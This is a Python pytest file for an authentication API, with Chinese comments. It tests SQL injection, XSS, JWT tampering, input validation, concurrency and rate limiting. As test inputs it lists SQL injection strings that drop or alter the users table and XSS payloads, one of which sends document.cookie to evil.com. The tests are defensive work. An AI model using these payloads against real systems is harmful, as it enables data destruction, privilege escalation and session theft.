"""
认证领域安全性和边界条件测试

测试系统的安全性和边界条件处理，包括：
- SQL注入防护
- XSS攻击防护
- 令牌安全测试
- 输入验证边界条件
- 并发安全测试
- 性能边界测试
"""

import pytest
import asyncio
import time
from datetime import datetime, timezone, timedelta
from unittest.mock import patch, AsyncMock
from uuid import uuid4
from fastapi.testclient import TestClient

from ...api.main import app
from src.domains.auth.schemas import GuestInitRequest, LoginRequest
from ..service import JWTService


@pytest.fixture
def client() -> TestClient:
    """创建测试客户端"""
    return TestClient(app)


@pytest.mark.security
class TestSQLInjectionProtection:
    """SQL注入防护测试"""

    def test_guest_init_sql_injection_attempt(self, client: TestClient):
        """测试游客初始化SQL注入尝试"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "'; INSERT INTO users (username) VALUES ('hacked'); --",
            "1' UNION SELECT username FROM users --",
            "'; UPDATE users SET is_admin=1 WHERE '1'='1' --"
        ]

        for malicious_input in malicious_inputs:
            request_data = {"device_id": malicious_input}

            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                mock_auth_service.init_guest_account.return_value = {
                    "user_id": str(uuid4()),
                    "access_token": "mock_token",
                    "refresh_token": "mock_refresh",
                    "token_type": "bearer",
                    "expires_in": 1800,
                    "is_guest": True
                }
                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/guest/init", json=request_data)

                # 应该正常处理，不应该导致SQL错误
                assert response.status_code != 500
                if response.status_code == 200:
                    data = response.json()
                    assert "success" in data

    def test_phone_number_sql_injection(self, client: TestClient):
        """测试手机号SQL注入尝试"""
        malicious_phones = [
            "13800138000'; DROP TABLE users; --",
            "1' OR '1'='1",
            "99999999999' UNION SELECT * FROM users --",
            "'; DELETE FROM sms_verification; --"
        ]

        for phone in malicious_phones:
            request_data = {"phone": phone, "verification_type": "login"}

            with patch('src.domains.auth.router.create_auth_service') as mock_service, \
                 patch('src.domains.auth.router.get_current_user_id') as mock_user_id:

                mock_user_id.return_value = uuid4()
                mock_auth_service = AsyncMock()
                mock_auth_service.send_sms_code.side_effect = Exception("验证失败")
                mock_service.return_value = mock_auth_service

                response = client.post(
                    "/api/v1/auth/sms/send",
                    json=request_data,
                    headers={"Authorization": "Bearer mock_token"}
                )

                # 应该被验证器拒绝或安全处理
                assert response.status_code != 500

    def test_login_sql_injection(self, client: TestClient):
        """测试登录SQL注入尝试"""
        malicious_identifiers = [
            "admin'; DROP TABLE users; --",
            "1' OR '1'='1' --",
            "'; UPDATE users SET password='hacked' --",
            "' UNION SELECT username, password FROM users --"
        ]

        for identifier in malicious_identifiers:
            request_data = {
                "identifier": identifier,
                "login_type": "password",
                "password": "password"
            }

            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                mock_auth_service.login.side_effect = Exception("认证失败")
                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/login", json=request_data)

                # 应该安全处理，不应该导致SQL错误
                assert response.status_code != 500


@pytest.mark.security
class TestXSSProtection:
    """XSS攻击防护测试"""

    def test_guest_init_xss_attempt(self, client: TestClient):
        """测试游客初始化XSS尝试"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "{{7*7}}",  # 模板注入
            "${7*7}",  # 表达式注入
        ]

        for payload in xss_payloads:
            request_data = {
                "device_id": payload,
                "device_type": payload,
                "app_version": payload
            }

            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                mock_auth_service.init_guest_account.return_value = {
                    "user_id": str(uuid4()),
                    "access_token": "mock_token",
                    "refresh_token": "mock_refresh",
                    "token_type": "bearer",
                    "expires_in": 1800,
                    "is_guest": True
                }
                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/guest/init", json=request_data)

                # 检查响应中不包含脚本标签
                if response.status_code == 200:
                    response_text = response.text
                    assert "<script>" not in response_text
                    assert "javascript:" not in response_text
                    assert "alert(" not in response_text

    def test_nickname_xss_attempt(self, client: TestClient):
        """测试昵称XSS尝试"""
        xss_nicknames = [
            "<script>document.location='http://evil.com'</script>",
            "img src=x onerror=fetch('http://evil.com/steal?cookie='+document.cookie)",
            "<iframe src=javascript:alert('XSS')>",
            "data:text/html,<script>alert('XSS')</script>"
        ]

        for nickname in xss_nicknames:
            request_data = {
                "phone": "13800138000",
                "sms_code": "123456",
                "nickname": nickname,
                "password": "password123"
            }

            with patch('src.domains.auth.router.create_auth_service') as mock_service, \
                 patch('src.domains.auth.router.get_current_user_id') as mock_user_id:

                mock_user_id.return_value = uuid4()
                mock_auth_service = AsyncMock()
                mock_auth_service.upgrade_guest_account.side_effect = Exception("处理失败")
                mock_service.return_value = mock_auth_service

                response = client.post(
                    "/api/v1/auth/guest/upgrade",
                    json=request_data,
                    headers={"Authorization": "Bearer mock_token"}
                )

                # 检查响应中不包含恶意脚本
                response_text = response.text
                assert "<script>" not in response_text or response.status_code != 200


@pytest.mark.security
class TestTokenSecurity:
    """令牌安全测试"""

    def test_jwt_token_with_none_secret(self):
        """测试使用空密钥的JWT令牌"""
        with pytest.raises(Exception):
            jwt_service = JWTService(secret_key="")
            jwt_service.generate_tokens({"user_id": str(uuid4())})

    def test_jwt_token_tampering(self):
        """测试JWT令牌篡改"""
        jwt_service = JWTService(secret_key="original_secret")

        user_data = {"user_id": str(uuid4()), "user_type": "registered"}
        tokens = jwt_service.generate_tokens(user_data)
        original_token = tokens["access_token"]

        # 尝试篡改令牌
        parts = original_token.split('.')
        if len(parts) == 3:
            # 篡改payload部分
            tampered_token = f"{parts[0]}.invalid_payload.{parts[2]}"

            with pytest.raises(Exception):
                jwt_service.verify_token(tampered_token, "access")

    def test_jwt_token_replay_attack(self):
        """测试JWT令牌重放攻击"""
        jwt_service = JWTService(secret_key="test_secret")

        user_data = {"user_id": str(uuid4()), "user_type": "registered"}
        tokens = jwt_service.generate_tokens(user_data)
        token = tokens["access_token"]

        # 正常验证应该成功
        payload = jwt_service.verify_token(token, "access")
        assert payload is not None

        # 重复使用相同的令牌（在实际应用中应该通过黑名单机制防止）
        # 这里我们测试令牌本身是有效的
        payload2 = jwt_service.verify_token(token, "access")
        assert payload2 is not None

    def test_jwt_token_algorithm_confusion(self):
        """测试JWT算法混淆攻击"""
        jwt_service = JWTService(secret_key="test_secret")

        user_data = {"user_id": str(uuid4()), "user_type": "registered"}
        tokens = jwt_service.generate_tokens(user_data)
        token = tokens["access_token"]

        # 尝试使用不同算法验证
        with pytest.raises(Exception):
            # 尝试使用None算法验证（算法混淆攻击）
            import jwt
            jwt.decode(token, algorithms=["none"], options={"verify_signature": False})

    def test_token_expiry_boundary_conditions(self):
        """测试令牌过期边界条件"""
        jwt_service = JWTService(
            secret_key="test_secret",
            access_token_expire_minutes=0.001  # 约0.06秒
        )

        user_data = {"user_id": str(uuid4()), "user_type": "registered"}
        tokens = jwt_service.generate_tokens(user_data)
        token = tokens["access_token"]

        # 立即验证应该成功
        payload = jwt_service.verify_token(token, "access")
        assert payload is not None

        # 等待令牌过期
        time.sleep(0.1)

        # 过期后验证应该失败
        with pytest.raises(Exception, match="令牌已过期"):
            jwt_service.verify_token(token, "access")


@pytest.mark.edge_case
class TestInputValidationBoundaries:
    """输入验证边界条件测试"""

    def test_device_id_length_boundaries(self, client: TestClient):
        """测试设备ID长度边界"""
        # 测试空字符串
        response = client.post("/api/v1/auth/guest/init", json={"device_id": ""})
        # 应该处理空字符串，不崩溃
        assert response.status_code != 500

        # 测试非常长的设备ID
        very_long_device_id = "a" * 1000
        response = client.post("/api/v1/auth/guest/init", json={"device_id": very_long_device_id})
        # 应该被验证器拒绝或安全处理
        assert response.status_code != 500

        # 测试Unicode字符
        unicode_device_id = "设备-🎉-测试-中文-emoji"
        with patch('src.domains.auth.router.create_auth_service') as mock_service:
            mock_auth_service = AsyncMock()
            mock_auth_service.init_guest_account.return_value = {
                "user_id": str(uuid4()),
                "access_token": "mock_token",
                "refresh_token": "mock_refresh",
                "token_type": "bearer",
                "expires_in": 1800,
                "is_guest": True
            }
            mock_service.return_value = mock_auth_service

            response = client.post("/api/v1/auth/guest/init", json={"device_id": unicode_device_id})
            assert response.status_code == 200

    def test_phone_number_validation_boundaries(self, client: TestClient):
        """测试手机号验证边界"""
        invalid_phones = [
            "",  # 空字符串
            "123",  # 太短
            "1234567890123456",  # 太长
            "abcdefghijk",  # 非数字
            "123-456-7890",  # 包含特殊字符
            "+86 138 0013 8000",  # 包含空格
            None  # 空值
        ]

        for phone in invalid_phones:
            request_data = {"phone": phone, "verification_type": "login"}

            response = client.post(
                "/api/v1/auth/sms/send",
                json=request_data,
                headers={"Authorization": "Bearer mock_token"}
            )

            # 应该被验证器拒绝
            assert response.status_code == 422

    def test_password_security_boundaries(self, client: TestClient):
        """测试密码安全边界"""
        weak_passwords = [
            "",  # 空密码
            "123",  # 太短
            "password",  # 常见密码
            "12345678",  # 纯数字
            "aaaaaaaa",  # 重复字符
            "qwertyui",  # 键盘序列
        ]

        for password in weak_passwords:
            request_data = {
                "identifier": "testuser",
                "login_type": "password",
                "password": password
            }

            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                mock_auth_service.login.side_effect = Exception("弱密码被拒绝")
                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/login", json=request_data)
                # 应该被安全处理
                assert response.status_code != 500

    def test_sms_code_validation_boundaries(self, client: TestClient):
        """测试短信验证码验证边界"""
        invalid_codes = [
            "",  # 空字符串
            "12",  # 太短
            "1234567",  # 太长
            "abcdef",  # 非数字
            "12 3456",  # 包含空格
            "123-456",  # 包含特殊字符
        ]

        for code in invalid_codes:
            request_data = {
                "identifier": "13800138000",
                "login_type": "sms",
                "sms_code": code
            }

            response = client.post("/api/v1/auth/login", json=request_data)
            # 应该被验证器拒绝
            assert response.status_code == 422


@pytest.mark.edge_case
class TestConcurrencySafety:
    """并发安全测试"""

    def test_concurrent_guest_init_same_device(self, client: TestClient):
        """测试同一设备并发初始化游客账号"""
        import threading
        import time

        device_id = "concurrent-test-device"
        results = []
        errors = []

        def init_guest():
            try:
                with patch('src.domains.auth.router.create_auth_service') as mock_service:
                    mock_auth_service = AsyncMock()
                    mock_auth_service.init_guest_account.return_value = {
                        "user_id": str(uuid4()),
                        "access_token": f"token_{threading.current_thread().ident}",
                        "refresh_token": "refresh_token",
                        "token_type": "bearer",
                        "expires_in": 1800,
                        "is_guest": True
                    }
                    mock_service.return_value = mock_auth_service

                    response = client.post("/api/v1/auth/guest/init", json={
                        "device_id": device_id
                    })
                    results.append((response.status_code, response.json()))
            except Exception as e:
                errors.append(e)

        # 创建10个并发请求
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=init_guest)
            threads.append(thread)

        # 启动所有线程
        for thread in threads:
            thread.start()

        # 等待所有线程完成
        for thread in threads:
            thread.join()

        # 验证结果
        assert len(errors) == 0, f"并发请求出现错误: {errors}"
        assert len(results) == 10

        # 检查是否有成功的结果
        successful_results = [r for r in results if r[0] == 200]
        assert len(successful_results) > 0

    def test_concurrent_sms_requests_same_phone(self, client: TestClient):
        """测试同一手机号并发短信请求"""
        import threading

        phone = "13800138000"
        results = []

        def send_sms():
            with patch('src.domains.auth.router.create_auth_service') as mock_service, \
                 patch('src.domains.auth.router.get_current_user_id') as mock_user_id:

                mock_user_id.return_value = uuid4()
                mock_auth_service = AsyncMock()

                # 模拟频率限制
                if len(results) > 0:
                    mock_auth_service.send_sms_code.side_effect = Exception("发送过于频繁")
                else:
                    mock_auth_service.send_sms_code.return_value = "123456"

                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/sms/send", json={
                    "phone": phone,
                    "verification_type": "login"
                }, headers={"Authorization": "Bearer mock_token"})
                results.append(response.status_code)

        # 创建5个并发请求
        threads = []
        for _ in range(5):
            thread = threading.Thread(target=send_sms)
            threads.append(thread)

        # 启动所有线程
        for thread in threads:
            thread.start()

        # 等待所有线程完成
        for thread in threads:
            thread.join()

        # 验证只有部分请求成功（其他被频率限制）
        success_count = sum(1 for status in results if status == 200)
        assert 0 < success_count < 5  # 至少有一个成功，但不是全部

    def test_concurrent_token_refresh(self, client: TestClient):
        """测试并发令牌刷新"""
        import threading

        refresh_token = "test_refresh_token"
        results = []

        def refresh_token_func():
            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                mock_auth_service.refresh_token.return_value = {
                    "access_token": f"new_token_{threading.current_thread().ident}",
                    "refresh_token": "new_refresh_token",
                    "token_type": "bearer",
                    "expires_in": 1800
                }
                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/refresh", json={
                    "refresh_token": refresh_token
                })
                results.append(response.json())

        # 创建10个并发请求
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=refresh_token_func)
            threads.append(thread)

        # 启动所有线程
        for thread in threads:
            thread.start()

        # 等待所有线程完成
        for thread in threads:
            thread.join()

        # 验证所有请求都成功处理
        assert len(results) == 10
        for result in results:
            assert "access_token" in result


@pytest.mark.performance
class TestPerformanceBoundaries:
    """性能边界测试"""

    def test_large_concurrent_load(self, client: TestClient):
        """测试大并发负载"""
        import threading
        import time

        start_time = time.time()
        results = []
        errors = []

        def make_request():
            try:
                with patch('src.domains.auth.router.create_auth_service') as mock_service:
                    mock_auth_service = AsyncMock()
                    mock_auth_service.init_guest_account.return_value = {
                        "user_id": str(uuid4()),
                        "access_token": "mock_token",
                        "refresh_token": "mock_refresh",
                        "token_type": "bearer",
                        "expires_in": 1800,
                        "is_guest": True
                    }
                    mock_service.return_value = mock_auth_service

                    response = client.post("/api/v1/auth/guest/init", json={
                        "device_id": f"load-test-{threading.current_thread().ident}"
                    })
                    results.append(response.status_code)
            except Exception as e:
                errors.append(e)

        # 创建50个并发请求
        threads = []
        for _ in range(50):
            thread = threading.Thread(target=make_request)
            threads.append(thread)

        # 启动所有线程
        for thread in threads:
            thread.start()

        # 等待所有线程完成
        for thread in threads:
            thread.join()

        end_time = time.time()
        total_time = end_time - start_time

        # 验证性能指标
        assert len(errors) == 0, f"负载测试出现错误: {errors}"
        assert len(results) == 50
        success_rate = sum(1 for status in results if status == 200) / len(results)
        assert success_rate >= 0.95, f"成功率过低: {success_rate}"
        assert total_time < 10.0, f"响应时间过长: {total_time}秒"

    def test_request_timeout_handling(self, client: TestClient):
        """测试请求超时处理"""
        import threading
        import time

        def slow_request():
            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                # 模拟慢响应
                time.sleep(0.1)
                mock_auth_service.init_guest_account.return_value = {
                    "user_id": str(uuid4()),
                    "access_token": "mock_token",
                    "refresh_token": "mock_refresh",
                    "token_type": "bearer",
                    "expires_in": 1800,
                    "is_guest": True
                }
                mock_service.return_value = mock_auth_service

                start_time = time.time()
                response = client.post("/api/v1/auth/guest/init", json={
                    "device_id": "timeout-test"
                })
                end_time = time.time()

                return response.status_code, end_time - start_time

        # 测试多个慢请求
        results = []
        threads = []
        for _ in range(5):
            thread = threading.Thread(target=lambda: results.append(slow_request()))
            threads.append(thread)

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # 验证所有请求都完成，没有超时
        assert len(results) == 5
        for status, duration in results:
            assert status == 200
            assert duration < 5.0  # 请求应该在5秒内完成

    def test_memory_usage_boundary(self, client: TestClient):
        """测试内存使用边界"""
        import gc
        import psutil
        import os

        # 获取当前进程
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss

        # 创建大量请求
        for i in range(100):
            with patch('src.domains.auth.router.create_auth_service') as mock_service:
                mock_auth_service = AsyncMock()
                mock_auth_service.init_guest_account.return_value = {
                    "user_id": str(uuid4()),
                    "access_token": f"token_{i}",
                    "refresh_token": "refresh_token",
                    "token_type": "bearer",
                    "expires_in": 1800,
                    "is_guest": True
                }
                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/guest/init", json={
                    "device_id": f"memory-test-{i}"
                })
                assert response.status_code == 200

        # 强制垃圾回收
        gc.collect()

        # 检查内存使用
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory

        # 内存增长应该合理（小于100MB）
        assert memory_increase < 100 * 1024 * 1024, f"内存增长过多: {memory_increase / 1024 / 1024}MB"


@pytest.mark.security
class TestRateLimitingSecurity:
    """频率限制安全测试"""

    def test_sms_rate_limit_enforcement(self, client: TestClient):
        """测试短信频率限制强制执行"""
        phone = "13800138001"

        with patch('src.domains.auth.router.create_auth_service') as mock_service, \
             patch('src.domains.auth.router.get_current_user_id') as mock_user_id:

            mock_user_id.return_value = uuid4()
            mock_auth_service = AsyncMock()

            # 第一次请求成功
            mock_auth_service.send_sms_code.return_value = "123456"
            mock_service.return_value = mock_auth_service

            response1 = client.post("/api/v1/auth/sms/send", json={
                "phone": phone,
                "verification_type": "login"
            }, headers={"Authorization": "Bearer mock_token"})

            assert response1.status_code == 200

            # 后续请求被频率限制
            mock_auth_service.send_sms_code.side_effect = Exception("发送过于频繁")

            for i in range(5):
                response = client.post("/api/v1/auth/sms/send", json={
                    "phone": phone,
                    "verification_type": "login"
                }, headers={"Authorization": "Bearer mock_token"})

                # 应该被频率限制
                assert response.status_code == 400

    def test_login_attempt_rate_limiting(self, client: TestClient):
        """测试登录尝试频率限制"""
        identifier = "testuser"

        with patch('src.domains.auth.router.create_auth_service') as mock_service:
            mock_auth_service = AsyncMock()

            # 模拟多次失败登录
            for i in range(10):
                if i < 5:
                    mock_auth_service.login.side_effect = Exception("密码错误")
                else:
                    # 超过频率限制
                    mock_auth_service.login.side_effect = Exception("尝试过于频繁")

                mock_service.return_value = mock_auth_service

                response = client.post("/api/v1/auth/login", json={
                    "identifier": identifier,
                    "login_type": "password",
                    "password": f"wrong_password_{i}"
                })

                if i < 5:
                    assert response.status_code == 401
                else:
                    # 可能被频率限制
                    assert response.status_code in [401, 429]